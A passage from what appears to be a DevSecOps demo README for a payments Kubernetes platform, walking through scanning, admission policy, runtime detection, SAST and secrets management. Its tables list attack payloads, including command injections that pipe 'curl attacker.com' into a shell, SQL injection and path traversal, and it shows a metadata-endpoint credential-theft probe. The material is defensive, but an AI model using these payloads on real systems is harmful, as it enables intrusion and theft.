Then query logs alongside metrics in the same dashboard:
```logql
{namespace="payments-dev"} |= "payment.authorised"
{namespace="payments-dev", container="consumer"} | json | line_format "{{.message}}"
```

Apply alert rules:
```bash
make alert-rules
```

Open Grafana → Alerting → Alert rules — you'll see:
- **HPAAtMaxReplicas** — fires if HPA stays at max for 5 minutes
- **PodCrashLooping** — fires after 3 restarts in 15 minutes
- **RabbitMQQueueDepthHigh** — fires when queue > 1000 messages
- **RabbitMQNodeDown** — fires within 1 minute of a broker node going offline

> *"Prometheus gives you metrics. Loki gives you logs. Together in Grafana you get the
> full picture: you see CPU spike in the metric, then correlate it with the exact log
> line that caused it — without switching tools. For PCI-DSS Requirement 10, 30-day
> log retention is configured in both Prometheus and Loki. The AlertManager rules mean
> we know about problems before customers do — which is the stated goal."*

---

### 14. DAST — OWASP ZAP dynamic scan

This runs automatically in GitHub Actions (`.github/workflows/dast.yaml`) on every push
to master, weekly (Monday 2am), and can be triggered manually via **Actions → DAST — OWASP ZAP → Run workflow**.

Findings surface in two places:

1. **GitHub Security tab** — ZAP output is converted to SARIF and uploaded with `category: zap-baseline`. Each alert appears as a code scanning alert anchored to `dast/scan-target.txt` (the physical location anchor required by GitHub Code Scanning, since DAST findings reference HTTP endpoints rather than source lines).
2. **CI artifact** — download the `zap-report` artifact from the Actions run → open `report_html.html` in a browser.

The report shows:
- HTTP response headers checked (Content-Security-Policy, X-Frame-Options, HSTS)
- Spider results — all URLs discovered and tested
- Alerts by severity with evidence and remediation guidance

Open `.zap/rules.tsv` — shows which rules are WARN vs IGNORE and why (e.g. HSTS is
ignored because TLS terminates at Istio, not at nginx directly).

> *"SAST and SCA tell you about problems in source code and known CVEs in packages.
> DAST tells you what an attacker actually sees when they hit the running application over
> HTTP. CodeQL won't catch a missing Content-Security-Policy header. ZAP will. Running
> all three — SAST, SCA, DAST — is the complete shift-left picture. Findings appear in
> the GitHub Security tab alongside SAST results — the developer sees everything in one
> place without downloading artifacts."*

---

### 15. PCI-DSS audit mapping

```bash
cat docs/pci-dss-mapping.md
```

Walk down the table — every PCI-DSS requirement maps to a specific file.

> *"Audit readiness isn't just having the controls — it's pointing an auditor at evidence
> immediately. Signed Git commits in ArgoCD are the change log, Kyverno policies are the
> enforcement evidence, KMS rotation is automatic and logged in Cloud Audit Logs."*

---

### 16. Supply chain A/B — attack and defence scenarios

Five attack scenarios, each with a positive (defended) and negative (attack attempt) path.
All scenarios require the cluster to be running (`make cluster`).

---

#### A. Vulnerable image caught at build time (Trivy)

**Attack:** ship a workload built on a known-vulnerable base image.

```bash
# Negative — build the intentionally bad image (nginx 1.14.0, ~40 known CVEs):
docker build -f demo/vulnerable/Dockerfile -t demo-vulnerable .
trivy image demo-vulnerable
# Expected: CRITICAL CVEs — buffer overflows, remote code exec in nginx + OpenSSL
```

```bash
# Positive — scan the hardened image used in production:
trivy image nginxinc/nginx-unprivileged:1.27-alpine
# Expected: 0 CRITICAL, 0 HIGH
```

Point at `.github/workflows/ci.yaml` line 105 — `exit-code: "1"` on CRITICAL/HIGH.
The vulnerable image would never reach GHCR; the build fails before `docker push`.

> *"The Trivy gate runs in the CI pipeline before the image is pushed to any registry.
> The attacker's image fails the build — it never reaches production. `exit-code: '1'`
> proves this is enforcement, not advisory. Show both scans side-by-side."*

---

#### B. Unsigned image blocked at admission (Kyverno)

**Attack:** push an image to the registry by bypassing the signed-build pipeline, then try to deploy it.

```bash
# Negative — try to run any unsigned image in the protected namespace:
kubectl run supply-chain-attack \
  --image=alpine:3.19 \
  --namespace payments-dev \
  --restart=Never

# Expected:
# Error from server: admission webhook denied the request:
# image alpine:3.19 failed cosign verification
```

```bash
# Same result for a Deployment — the policy applies to all pod-creating resources:
kubectl apply -f demo/unsigned-deploy.yaml
# Expected: same admission webhook error
```

```bash
# Show the policy that blocks it:
kubectl get clusterpolicy verify-images -o yaml
# Key fields: attestors.keyless.subject (GitHub Actions identity)
#             mutateDigest: true — any image that does pass is pinned to its immutable digest
```

> *"Scanning tells you whether an image has known CVEs. Signing answers a different question:
> is the thing running in my cluster exactly what the pipeline built — or did someone swap
> it between build and deploy? No pipeline = no signature = blocked at admission. The
> mutateDigest flag means even a tag-mutation attack ('latest' pointing to a different image)
> is blocked — every deployed image is locked to a content-addressed SHA256 digest."*

---

#### C. SBOM reveals a hidden vulnerable dependency (syft + grype)

The CI pipeline generates a full Software Bill of Materials at build time. You can interrogate
it without rebuilding anything.

```bash
# Install grype (one-time):
curl -sSfL https://raw.githubusercontent.com/anchore/grype/main/install.sh | sh -s -- -b /usr/local/bin

# Positive — SBOM of the hardened production image:
syft nginxinc/nginx-unprivileged:1.27-alpine -o spdx-json > /tmp/nginx-sbom.json
grype sbom:/tmp/nginx-sbom.json
# Expected: 0 findings (or low — no CRITICAL/HIGH)
```

```bash
# Negative — SBOM of the vulnerable demo image:
syft nginx:1.14.0 -o spdx-json > /tmp/vuln-sbom.json
grype sbom:/tmp/vuln-sbom.json
# Expected: ~40 CVEs across nginx, OpenSSL, zlib — visible without rebuilding
```

```bash
# Real-world use case — answer "do we ship Log4j?" without redeploy:
grype sbom:/tmp/nginx-sbom.json | grep -i log4j
# Instant answer from the static SBOM — no running containers needed
```

> *"In an incident like Log4Shell you need to know in minutes, not hours, which services
> are affected. SBOMs generated at build time and stored as OCI attestations let you
> query across every image in your registry instantly. That's what 'shift-left' means
> for supply chain — the evidence is captured at build, not reconstructed during the incident."*

---

#### D. Runtime attack detected by Falco

With Falco running, unexpected behaviour inside a container fires an alert at the syscall level
— it cannot be tampered with from inside the container.

**Open two terminals:**

```bash
# Terminal 1 — watch for Falco events:
kubectl logs -n falco -l app.kubernetes.io/name=falco -f
```

```bash
# Terminal 2 — simulate post-exploitation behaviour (attacker gets RCE, opens a shell):
kubectl exec -n payments-dev -it \
  $(kubectl get pod -n payments-dev -l app.kubernetes.io/name=nginx-app -o name | head -1) \
  -- /bin/sh
```

Terminal 1 fires immediately:
```
Notice A shell was spawned in a container with an attached terminal
  (user=root k8s.ns=payments-dev k8s.pod=dev-nginx-app-xxx
   proc.cmdline=sh image=nginxinc/nginx-unprivileged:1.27-alpine)
```

```bash
# Inside the pod — try to write to the filesystem:
touch /etc/test
# Result: touch: /etc/test: Read-only file system  ← securityContext blocks the write
# Falco also logs: Write below monitored dir /etc
```

```bash
# Inside the pod — try to reach the GCP metadata endpoint (credential theft):
wget -T 2 http://169.254.169.254/latest/meta-data/ 2>&1 || true
# Falco logs: Outbound connection to IP/Port outside allowed list
```

> *"Kyverno and PSS prevent bad pods from being scheduled. Falco watches what's happening
> inside running containers at the kernel syscall level. The three detections — shell spawn,
> filesystem write, metadata endpoint probe — are the classic post-exploitation playbook
> after a container escape. You need prevention AND detection; one without the other leaves
> a gap."*

---

#### E. NetworkPolicy blocks lateral movement

**Attack:** a compromised pod tries to reach services it has no business talking to.

```bash
# Negative — a rogue pod with no allowed egress tries to reach RabbitMQ:
kubectl run lateral-move \
  --image=busybox:1.36 \
  --namespace payments-dev \
  --rm -it \
  --restart=Never \
  -- sh

# Inside the pod:
wget -T 3 http://rabbitmq.payments-dev.svc:5672 2>&1 || echo "BLOCKED"
# Expected: wget: download timed out — NetworkPolicy default-deny blocks it
```

```bash
# Show what's allowed and what isn't:
kubectl get networkpolicy -n payments-dev
# allow-consumer-to-rabbitmq: only pods with app.kubernetes.io/name=payment-consumer
# allow-producer-to-rabbitmq: only pods with job-name=payment-producer
# The busybox pod matches neither — it's blocked even inside the same namespace
```

```bash
# Positive — a legitimate consumer pod CAN reach RabbitMQ (it has the right label):
kubectl exec -n payments-dev \
  $(kubectl get pod -n payments-dev -l app.kubernetes.io/name=payment-consumer -o name | head -1) \
  -- sh -c "wget -qO- http://rabbitmq.payments-dev.svc:15672 > /dev/null && echo OK"
# Expected: OK
```

> *"Default-deny NetworkPolicy means every new pod is isolated until you explicitly allow
> it. In a flat network, a compromised pod can reach any service on the cluster. With
> NetworkPolicy, even if an attacker gets code execution in one pod, they can't pivot to the
> message broker, the metrics endpoint, or any other service — they're in a one-pod jail.
> The consumer can reach RabbitMQ because we explicitly said so. The rogue pod can't because
> we never did."*

---

#### F. Hardcoded secret caught before the image is built (Trivy + GitHub Push Protection)

`demo/insecure-code/vulnerable_payment.py` contains five real vulnerability classes.
This scenario has two defence layers — and both fired during the development of this repo.

**Defence layer 1 — GitHub Push Protection (caught at `git push`):**

When this repo was built, the commit containing a real-format Stripe key (`sk_live_...`)
was blocked by GitHub Push Protection before it reached the remote:

```
remote: — GITHUB PUSH PROTECTION
remote:   Push cannot contain secrets
remote:   —— Stripe API Key ——
remote:     path: demo/insecure-code/vulnerable_payment.py
```

The attacker's key never reaches the repository. The block happens at the developer's
machine — before CI, before the registry, before any other system sees it.

**Defence layer 2 — Trivy secret scan (caught in CI and locally):**

```bash
# Scan the vulnerable file locally — catches the hardcoded pattern:
trivy fs --scanners secret demo/insecure-code/vulnerable_payment.py
# Expected: CRITICAL — hardcoded credential detected in PAYMENT_GATEWAY_KEY
```

```bash
# Positive — secure version has nothing to find:
trivy fs --scanners secret demo/insecure-code/secure_payment.py
# Expected: 0 findings — credential is in os.environ[], not in code
```

Open both files side-by-side. The secure version uses `os.environ["PAYMENT_GATEWAY_KEY"]`
— the value is injected at runtime from a K8s Secret, never in source control.

**Defence layer 0 — pre-commit hook (caught before `git commit`):**

`.pre-commit-config.yaml` adds a gitleaks and detect-secrets hook that runs on every
`git commit`. This is the earliest possible catch — before the key is even in local
git history:

```bash
# Install once:
pip install pre-commit && pre-commit install

# Now any commit containing a real secret pattern is blocked:
# git commit -m "add payment config"
# gitleaks — scan for secrets before commit..........Failed
#   rule:    stripe-api-key
#   file:    demo/insecure-code/vulnerable_payment.py
#   commit:  (not yet created)
```

Three independent layers, earliest to latest:
- **Layer 0**: pre-commit hook → blocks `git commit` before it creates a local SHA
- **Layer 1**: GitHub Push Protection → blocks `git push` before the remote accepts it
- **Layer 2**: Trivy secret scan in CI → fails the build if anything slips past layers 0 and 1

> *"Two independent layers caught this during PoC development — I can show you the rejection
> message. The pre-commit hook would have caught it even earlier: before the commit existed,
> before it touched the network. Three-layer defence for a single vulnerability class is
> what PCI-DSS Req 8 means by 'layered security' — one control failure doesn't mean a breach."*

---

#### G. Dangerous functions caught by SAST (CodeQL + Snyk)

Two files, two languages — the same vulnerability classes appear in Python and PHP because
these are not language-specific bugs, they are pattern-level mistakes that appear wherever
user input touches a dangerous function.

**Python** — open `demo/insecure-code/vulnerable_payment.py`:

CWEs annotated with the attack scenario and which tool catches it:

| Function | CWE | Attack scenario | Caught by |
|---|---|---|---|
| `PAYMENT_GATEWAY_KEY = "..."` | CWE-798 | Key in git history + CI logs | Trivy, gitleaks, GitHub Push Protection |
| `f"SELECT ... WHERE user_id = '{user_id}'"` | CWE-89 SQL injection | `' OR '1'='1'` dumps all card data | CodeQL, Snyk |
| `os.system(f"...{report_name}")` | CWE-78 Command injection | `report; curl attacker.com \| sh` | CodeQL, Snyk |
| `hashlib.md5(card_number.encode())` | CWE-327 Broken crypto | MD5 collisions — PCI-DSS Req 3.4 fail | Snyk DeepCode |
| `pickle.loads(session_blob)` | CWE-502 Unsafe deserialisation | Craft payload → arbitrary code on load | Snyk, CodeQL |

**PHP** — open `demo/insecure-code/vulnerable_payment.php`:

| Function | CWE | Attack scenario | Caught by |
|---|---|---|---|
| `$db_password = 'P@ymentDB...'` | CWE-798 | Credential in source / git history | Trivy, gitleaks |
| `mysql_query("... " . $_GET['id'])` | CWE-89 SQL injection | `1 OR 1=1` dumps all payment rows | **Semgrep** (`p/php`), Snyk |
| `echo $_GET['status']` | CWE-79 XSS | `<script>` tag steals session cookie | **Semgrep** (`p/php`), Snyk, **OWASP ZAP** |
| `exec("generate_receipt.sh " . $amount)` | CWE-78 Command injection | `100; curl attacker.com \| sh` | **Semgrep** (`p/php`), Snyk |
| `include('/templates/' . $_GET['template'])` | CWE-22 Path traversal | `../../etc/passwd` discloses server files | **Semgrep** (`p/php`), Snyk |
| `md5($card_number)` | CWE-327 Broken crypto | MD5 collision — PCI-DSS Req 3.4 fail | **Semgrep** (`p/php`), Snyk DeepCode |

Note two things about the PHP column:
- **Semgrep** (not CodeQL) is the PHP SAST tool — CodeQL does not support PHP natively. Semgrep's `p/php` OSS ruleset covers all five CWEs and uploads SARIF to the GitHub Security tab via the `semgrep` CI job.
- **OWASP ZAP DAST** catches CWE-79 (XSS) in the HTTP response at runtime. Static scanners see the vulnerable `echo` statement; ZAP sees the actual malicious HTTP response — that's why SAST + DAST are both required.

Now open the secure versions (`secure_payment.py` / `secure_payment.php`) and walk the fixes:

```python
# Python fixes:
cursor.execute("SELECT ... WHERE user_id = ?", (user_id,))    # parameterised query
subprocess.run(["script.sh", name], shell=False)               # list args, no shell
hashlib.pbkdf2_hmac("sha256", card.encode(), salt, 600_000)   # PBKDF2 with salt
json.loads(session_blob)                                        # no code execution surface
```

```php
// PHP fixes:
$stmt = $pdo->prepare('SELECT ... WHERE id = :id');            // PDO prepared statement
$status = htmlspecialchars($_GET['status'], ENT_QUOTES, 'UTF-8'); // output encoding
$safe = escapeshellarg($amount);                               // shell-safe wrapping
$path = $allowed[$name];  include $path;                       // allowlist, not user path
hash_hmac('sha256', $card_number, getenv('CARD_HASH_KEY'));    // HMAC-SHA256
```

> *"Same bug classes, two languages — intentional. These are not language-specific mistakes; they appear wherever developers stop treating input as hostile. For Python, CodeQL traces full data flow from function argument to cursor.execute() — fewer false positives than grep-based tools. For PHP, CodeQL has no native support, so Semgrep's p/php ruleset fills the gap — same findings, different engine, all in the same Security tab. The ZAP finding for CWE-79 XSS is the one no static scanner captures: it needs a running application returning a real HTTP response. SAST catches what's in the code; DAST catches what an attacker actually sees."*

| Function | CWE | Attack scenario | Caught by |
|---|---|---|---|
| `PAYMENT_GATEWAY_KEY = "sk_live_..."` | CWE-798 | Key in git history + CI logs | Trivy secret scan |
| `f"SELECT ... WHERE user_id = '{user_id}'"` | CWE-89 SQL injection | `' OR '1'='1'` dumps all card data | CodeQL, Snyk |
| `os.system(f"generate_report.sh {report_name}")` | CWE-78 Command injection | `report; curl attacker.com \| sh` | CodeQL, Snyk |
| `hashlib.md5(card_number.encode())` | CWE-327 Broken crypto | MD5 collisions — PCI-DSS Req 3.4 failure | Snyk DeepCode |
| `pickle.loads(session_blob)` | CWE-502 Unsafe deserialisation | Craft payload → arbitrary code execution on load | Snyk, CodeQL |

Now open `demo/insecure-code/secure_payment.py` and walk through the remediations:

```python
# CWE-89 fix: parameterised query — user input is never in the SQL string
cursor.execute("SELECT card_number, amount FROM payments WHERE user_id = ?", (user_id,))

# CWE-78 fix: allowlist regex + subprocess list args — no shell involved
if not re.fullmatch(r"[a-z0-9_-]{1,64}", report_name): raise ValueError(...)
subprocess.run(["generate_report.sh", report_name], shell=False)

# CWE-327 fix: PBKDF2-HMAC-SHA256 with 32-byte random salt + 600,000 iterations
salt = secrets.token_bytes(32)
dk = hashlib.pbkdf2_hmac("sha256", card_number.encode(), salt, 600_000)

# CWE-502 fix: JSON has no code execution surface + schema key validation
session = json.loads(session_blob)
required_keys = {"user_id", "expires_at", "cart_total_pence"}
if not required_keys.issubset(session): raise ValueError(...)
```

> *"SAST catches these before the first line runs in any environment. The developer sees
> the annotation on their PR diff — SQL injection on line 23 — with the fix suggestion
> inline. That's shift-left in practice: the cost to fix a SQLi pre-merge is minutes;
> post-breach it's months and a PCI-DSS QSA. CodeQL traces full data flow — it follows
> the taint from the function argument to cursor.execute(), which is why it has lower
> false positives than grep-based tools. The payments context makes CWE-89 and CWE-327
> particularly critical — card data in plaintext or under broken crypto is a Req 3 breach."*

---

#### H. Kyverno policy unit tests (no cluster required)

A policy with a syntax error that silently passes everything is as dangerous as no policy.
This PoC unit-tests all admission policies before deploying them — same discipline as
application code.

```bash
make kyverno-test
# or: kyverno test kyverno/
```

Expected output:
```
Loading test  ( kyverno/tests/unit-test.yaml ) ...

  good-pod            require-non-root         check-runasnonroot  PASS
  bad-pod-root        require-non-root         check-runasnonroot  FAIL ✓
  good-pod            require-resource-limits  check-limits        PASS
  bad-pod-no-limits   require-resource-limits  check-limits        FAIL ✓
  good-pod            block-privileged-containers  no-privileged   PASS
  bad-pod-privileged  block-privileged-containers  no-privileged   FAIL ✓

Test Summary: 6 test(s) passed.
```

Open `kyverno/tests/unit-test.yaml` — each `result` entry explicitly asserts whether
the policy rule should PASS or FAIL for a given pod in `kyverno/tests/resources.yaml`.
If a policy change breaks the logic, the test suite catches it before cluster deployment.

> *"Kyverno policies are code. Code has tests. If I change the non-root policy and it
> accidentally starts passing root pods, the test suite catches it immediately — no
> cluster needed, no incident post-deploy. It runs in CI in seconds."*

---

#### One-stop security demo: `make security-scan`

Show the full scanning stack in a single command — no cluster required:

```bash
make security-scan
```

Five checks run in sequence:
1. **Secrets in source** — Trivy secret scan across all source files
2. **IaC misconfigs** — Trivy checks Terraform + K8s manifests for misconfigurations
3. **Production image** — Trivy confirms the hardened image has 0 CRITICAL/HIGH CVEs
4. **Vulnerable comparison** — builds `demo/vulnerable/Dockerfile` and shows the CVE delta
5. **SBOM CVE query** — syft generates SBOM, grype queries it without rebuilding

```bash
# Demonstrate RBAC least-privilege (requires a running cluster):
make rbac-audit
# Shows: nginx-app SA cannot create pods, read secrets, or list deployments
#        ArgoCD SA can patch Deployments but cannot delete or read Secrets

# After CI has run on master — prove the supply chain signature is real:
make verify-supply-chain
# Output: { subject, issuer, workflow } — confirms the image came from your pipeline
```

---

### 17. Secrets management — OpenBao locally, GCP Secret Manager in production

> **Why K8s Secrets alone aren't enough for PCI-DSS**
>
> A Kubernetes Secret is just a base64-encoded string stored in etcd. Without envelope encryption via KMS, anyone with `etcd` read access — or a `kubectl get secret` permission — gets the plaintext value. PCI-DSS Req 3.5 and 8.3 require secrets to be protected with strong cryptography, access-controlled at the individual secret level, and audit-logged on every access. K8s Secrets provide none of this out of the box.

#### The three-component pattern

```
┌──────────────────────────────────────────────────────────────────────┐
│  Secret store                  ESO               Pod                 │
│  (OpenBao / GCP SM)  ──────►  ExternalSecret ──► K8s Secret         │
│                               (reconcile loop)    (envFrom)          │
└──────────────────────────────────────────────────────────────────────┘
```

1. **Secret store** — the authoritative source of truth for secret values
2. **External Secrets Operator (ESO)** — watches `ExternalSecret` CRDs, fetches from the store, writes a K8s Secret
3. **K8s Secret** — what the pod actually mounts; it is ephemeral and never persisted to git

The pod manifest (`envFrom: secretRef: name: payment-gateway-key`) is identical regardless of whether the store is OpenBao or GCP Secret Manager. **Only the `ClusterSecretStore` changes between environments.**

#### Local / Codespaces: OpenBao

OpenBao is the open-source community fork of HashiCorp Vault, created after HashiCorp switched to the Business Source Licence. The API is identical — ESO's `vault` provider works with OpenBao unchanged.

```bash
# Install ESO + OpenBao, seed demo secrets, apply ExternalSecrets:
make secrets
```

What this does, step by step:
1. Installs ESO with CRDs into `external-secrets` namespace
2. Installs OpenBao in dev mode (single-node, in-memory, auto-unsealed, root token = `root`)
3. Creates a K8s Secret in `external-secrets` containing the root token — ESO uses this to authenticate
4. Port-forwards OpenBao and seeds two secrets:
   - `secret/payments/gateway` → `api_key` (random hex, simulates a payment gateway credential)
   - `secret/payments/database` → `password` + `host`
5. Applies the `ClusterSecretStore` (points ESO at OpenBao) and two `ExternalSecret` manifests
6. ESO reconciles within ~10 seconds and creates `payment-gateway-key` and `db-credentials` K8s Secrets in `payments-dev`

```bash
# Verify sync:
kubectl get externalsecret -n payments-dev
# NAME                   STORE     REFRESH INTERVAL   STATUS   READY
# payment-gateway-key    openbao   1m                 True     True
# db-credentials         openbao   1m                 True     True

kubectl get secret payment-gateway-key -n payments-dev -o jsonpath='{.data.api_key}' | base64 -d
# poc-demo-gateway-key-<random hex>

# Describe a secret to see ESO sync events:
kubectl describe externalsecret payment-gateway-key -n payments-dev
```

**Rotation demo:** Update the value in OpenBao, then within 1 minute ESO syncs it without restarting the pod:

```bash
kubectl port-forward -n openbao svc/openbao 8200:8200 &
export VAULT_ADDR=http://127.0.0.1:8200 VAULT_TOKEN=root
bao kv patch secret/payments/gateway api_key="rotated-key-$(openssl rand -hex 8)"

# Wait 60s then confirm the K8s Secret updated:
kubectl get secret payment-gateway-key -n payments-dev -o jsonpath='{.data.api_key}' | base64 -d
```

#### Production: GCP Secret Manager + Workload Identity

In GKE, the store changes to GCP Secret Manager. The ExternalSecret manifests and pod specs stay identical.

**Why GCP Secret Manager is better than running Vault in production:**

| | OpenBao (self-hosted) | GCP Secret Manager |
|---|---|---|
| Encryption at rest | Vault transit (manage yourself) | Cloud KMS CMEK (our `terraform/kms.tf` key) |
| HA | 3-node Raft cluster to operate | Fully managed, multi-region |
| Authentication | Token / AppRole / K8s auth | Workload Identity (no credential in-cluster) |
| Audit log | Vault audit backend | Cloud Audit Logs (satisfies PCI-DSS Req 10) |
| Secret access IAM | Vault policies | IAM at individual secret level |
| Cost | Infrastructure cost | Pay-per-access pricing |

**Workload Identity — how ESO authenticates without a JSON key file:**

```
ESO pod (K8s SA: external-secrets-sa)
  └──► GKE metadata server: "who am I?"
       └──► Workload Identity maps K8s SA → GCP SA (external-secrets-sa@project.iam)
            └──► GCP SA has secretmanager.secretAccessor on exactly these secrets
                 └──► GCP Secret Manager returns the secret value
```

No JSON key file. No static credential in-cluster. Token lifetime: 1 hour, auto-rotated by GKE.

**Terraform provisions the GCP side** (`terraform/secrets.tf`):
- `google_secret_manager_secret` resources with CMEK encryption
- `google_service_account` for ESO with `secretmanager.secretAccessor` on individual secrets only (not project-wide)
- `google_service_account_iam_member` binding the K8s SA → GCP SA (Workload Identity)

**To switch from OpenBao to GCP Secret Manager:**

```bash
# 1. Apply Terraform to create GCP resources:
cd terraform && terraform apply -var-file=../example.tfvars

# 2. Swap the ClusterSecretStore (only this file changes):
kubectl delete -f k8s/secrets/secret-store.yaml
kubectl apply  -f k8s/secrets/gcp-secret-store.yaml

# 3. Create secrets in GCP SM (one-time, by a human with appropriate IAM):
gcloud secrets versions add payment-gateway-key \
  --data-file=<(echo -n "real-gateway-key-value")
gcloud secrets versions add db-credentials-password \
  --data-file=<(echo -n "real-db-password")

# 4. ExternalSecret manifests are UNCHANGED — ESO picks up the new store automatically
kubectl get externalsecret -n payments-dev
```

#### PCI-DSS coverage

| Requirement | How secrets management addresses it |
|---|---|
| Req 3.5 — protect cryptographic keys | Keys never in git; ESO fetches at runtime; CMEK encryption at rest |
| Req 7.2 — least-privilege access | ESO SA has `secretAccessor` on individual secrets, not project-wide |
| Req 8.3 — secure individual credentials | DB password and API key stored separately; independently rotatable |
| Req 10.2 — audit log access | Every GCP SM `access` call appears in Cloud Audit Logs |
| Req 12.3 — protect system components | Workload Identity eliminates the JSON key file attack surface |

#### Key files

| File | Purpose |
|---|---|
| [`k8s/secrets/openbao-values.yaml`](k8s/secrets/openbao-values.yaml) | OpenBao Helm values (dev mode — local/Codespaces) |
| [`k8s/secrets/secret-store.yaml`](k8s/secrets/secret-store.yaml) | ESO `ClusterSecretStore` → OpenBao (local environment) |
| [`k8s/secrets/gcp-secret-store.yaml`](k8s/secrets/gcp-secret-store.yaml) | ESO `ClusterSecretStore` → GCP Secret Manager (production — GKE only) |
| [`k8s/secrets/external-secret.yaml`](k8s/secrets/external-secret.yaml) | Two `ExternalSecret` CRDs (identical in both environments) |
| [`terraform/secrets.tf`](terraform/secrets.tf) | GCP SM secrets + ESO service account + Workload Identity IAM |
| [`scripts/seed-secrets.sh`](scripts/seed-secrets.sh) | Seeds OpenBao with demo values (called by `make secrets`) |

---

## JD mapping

Every JD requirement maps to specific files in this repo. Open the file directly to show evidence.

| JD requirement | Demo step | Key files |
|---|---|---|
| Production Kubernetes (GKE) | Steps 1–2, 11 | `kind-config.yaml`, `terraform/gke.tf` (private cluster, Workload Identity, Shielded Nodes), `terraform/variables.tf` |
| Terraform for GCP | Step 11 | `terraform/main.tf` (provider), `terraform/gke.tf` (cluster), `terraform/vpc.tf` (VPC + Cloud Armor), `terraform/kms.tf` (KMS rotation), `terraform/outputs.tf` |
| CI/CD — GitHub Actions | Step 5 | `.github/workflows/ci.yaml` (lint → snyk → codeql → semgrep → trivy → sign → deploy/GitOps PR), `.github/workflows/dast.yaml` (ZAP), `.github/workflows/supply-chain.yaml` (SLSA provenance) |
| CI/CD — Google Cloud Build | Step 5 | `cloudbuild.yaml` (Trivy pinned to `aquasec/trivy:0.51.0`, not `latest`) |
| DNS, TLS / mTLS, load balancing | Step 9 | `istio/peer-authentication.yaml` (STRICT mTLS), `istio/authorization-policy.yaml` (deny-all + explicit allow) |
| Docker / container lifecycle | Steps 2, 16A | `Dockerfile` (hardened build), `k8s/base/deployment.yaml` (securityContext, probes, emptyDir mounts), `demo/vulnerable/Dockerfile` (negative comparison) |
| GitOps — ArgoCD + Kustomize | Steps 3–4 | `argocd/application.yaml` (prune + selfHeal), `argocd/values-argocd.yaml`, `k8s/base/kustomization.yaml`, `k8s/overlays/dev/kustomization.yaml`, `k8s/overlays/prod/kustomization.yaml` |
| Istio / service mesh | Step 9 | `istio/peer-authentication.yaml`, `istio/authorization-policy.yaml` |
| PCI-DSS at infrastructure level | Step 15 | `docs/pci-dss-mapping.md`, `k8s/base/networkpolicy.yaml`, `kyverno/policies/` (all five policies), `terraform/kms.tf` |
| GCP: KMS, Cloud Armor, Binary Authorization | Step 11 | `terraform/kms.tf` (90-day rotation, `prevent_destroy`), `terraform/vpc.tf` (Cloud Armor WAF, OWASP rules), `terraform/gke.tf` (`binary_authorization: PROJECT_SINGLETON_POLICY_ENFORCE`) |
| Local Kubernetes dev tooling (Tilt) | — | `Tiltfile`, `.devcontainer/devcontainer.json`, `.devcontainer/post-create.sh` |
| Prometheus + Grafana + alerting | Steps 6, 13 | `monitoring/values-kube-prometheus-stack.yaml` (30-day retention), `monitoring/values-loki-stack.yaml` (Loki + Promtail), `monitoring/alert-rules.yaml` (7 PrometheusRules) |
| Snyk IaC scanning | Step 5 | `.github/workflows/ci.yaml` — `snyk` job ("Snyk IaC Scan"), Snyk CLI binary, SARIF upload to GitHub Security tab (`category: snyk-iac`) |
| Trivy multi-scanner | Steps 5, 16A | `.github/workflows/ci.yaml` — `build-scan` job (lines 68–111), `exit-code: "1"` on CRITICAL/HIGH, `cloudbuild.yaml`, `demo/vulnerable/Dockerfile` |
| Supply chain / Binary Authorization | Steps 12, 16B–C | `.github/workflows/ci.yaml` — `sign` job (lines 113–145), `kyverno/policies/verify-images.yaml`, `.github/workflows/supply-chain.yaml` (SLSA), `demo/unsigned-deploy.yaml` |
| RabbitMQ async payment flow | Steps 7, 16E | `k8s/rabbitmq/consumer-deployment.yaml`, `k8s/rabbitmq/producer-job.yaml`, `k8s/rabbitmq/values-rabbitmq.yaml` (3-node quorum), `k8s/rabbitmq/pdb.yaml` (minAvailable: 2), `k8s/rabbitmq/networkpolicy.yaml` |
| Helm — authoring + consuming | Step 2 | `charts/nginx-app/Chart.yaml`, `charts/nginx-app/values.yaml`, `charts/nginx-app/templates/_helpers.tpl`, `charts/nginx-app/templates/deployment.yaml` |
| Runtime security | Step 10, 16D | Falco installed via `make falco`; `monitoring/alert-rules.yaml` |
| DAST | Step 14 | `.github/workflows/dast.yaml`, `.zap/rules.tsv` (rule overrides with rationale), `dast/scan-target.txt` (SARIF physicalLocation anchor) |
| Automated dependency updates | — | `.github/dependabot.yml` (weekly PRs: Actions + Docker + pip + Terraform + npm) |
| Vulnerability disclosure | — | `SECURITY.md` (private disclosure via GitHub Security Advisories) |
| SAST — dangerous functions (Python + PHP) | Steps 5, 16G | CodeQL → Python findings; Semgrep `p/php` → PHP findings; both upload SARIF to Security tab. `demo/insecure-code/vulnerable_payment.py` + `vulnerable_payment.php` (CWE-89/78/79/22/327/502/798), secure counterparts show remediations |
| Secret detection — three-layer defence | Step 16F | `.pre-commit-config.yaml` (gitleaks Layer 0), GitHub Push Protection (Layer 1, demonstrated live), `make security-scan` Trivy FS (Layer 2) |
| Policy unit testing | Step 16H | `kyverno/tests/unit-test.yaml`, `kyverno/tests/resources.yaml`, `make kyverno-test` |
| RBAC least-privilege audit | — | `k8s/rbac/rbac.yaml`, `make rbac-audit` (`kubectl auth can-i` for each service account) |
| Supply chain signature verification | Step 12, 16B | `make verify-supply-chain` (cosign verify + jq proof), `kyverno/policies/verify-images.yaml` |
| Secrets management (ESO + OpenBao / GCP SM) | Step 17 | `k8s/secrets/openbao-values.yaml`, `k8s/secrets/secret-store.yaml`, `k8s/secrets/external-secret.yaml`, `k8s/secrets/gcp-secret-store.yaml`, `terraform/secrets.tf`, `scripts/seed-secrets.sh` |
| CIS Kubernetes Benchmark (kube-bench) | `make kube-bench` | `k8s/kube-bench/kube-bench-job.yaml` — PCI-DSS Req 2.2, ISO 27001 A.8.9 |
| OpenSSF Scorecard | Automatic (push to master + weekly) | `.github/workflows/scorecard.yml` — 18 supply chain health checks, badge in README |

## Note on scope

Runs on a local **kind** cluster by design — the role explicitly values "keeping local
development environments working so engineers can run the full stack on their machines"
and names Tilt. Cloud IaC (`terraform/`) is real and `terraform plan`-validated against
GKE; demonstrated without live cloud spend. Open in GitHub Codespaces to run with zero
local setup.

---

## DevSecOps coverage — is everything here?

The shift-left model has five stages. All five are covered end-to-end:

| Stage | Controls |
|---|---|
| **Code** | CodeQL SAST (Python) + Copilot Autofix suggestions on PR diffs; Semgrep OSS (PHP + Python); Snyk DeepCode AI; signed commits (GPG Ed25519) |
| **Build** | Trivy (CVE + secrets + misconfigs); Snyk IaC scan; container build hardened from `nginx-unprivileged` |
| **Package** | cosign keyless signing (GitHub OIDC, no long-lived keys); syft SBOM (SPDX + CycloneDX) as OCI attestation; SLSA provenance |
